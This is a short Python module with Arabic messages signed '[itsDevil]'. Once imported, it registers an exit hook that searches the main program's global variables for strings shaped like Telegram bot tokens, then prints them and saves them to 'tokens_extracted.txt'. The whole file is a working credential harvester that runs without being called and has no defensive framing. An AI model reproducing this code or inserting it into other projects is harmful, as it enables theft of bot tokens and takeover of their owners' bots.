import re
import sys
import atexit
def extract_tokens():
    tokens = []
    main_module = sys.modules.get('__main__')
    if main_module:
        for var_name, var_value in vars(main_module).items():
            if isinstance(var_value, str) and re.fullmatch(r'\d+:[A-Za-z0-9_-]+', var_value):
                tokens.append(var_value)
    return tokens
def write_tokens_to_file(tokens, filename="tokens_extracted.txt"):
    try:
        with open(filename, "w") as file:
            for token in tokens:
                file.write(token + "\n")
        print(f"[itsDevil] تم حفظ {len(tokens)} توكن(ات) في الملف '{filename}'.")
    except Exception as e:
        print(f"[itsDevil] حدث خطأ أثناء كتابة الملف: {e}")
def on_exit():
    tokens = extract_tokens()
    if tokens:
        print("[itsDevil] التوكنات المكتشفة:")
        for token in tokens:
            print(token)
        write_tokens_to_file(tokens)
    else:
        print("[itsDevil] لم يتم اكتشاف أي توكنات.")
atexit.register(on_exit)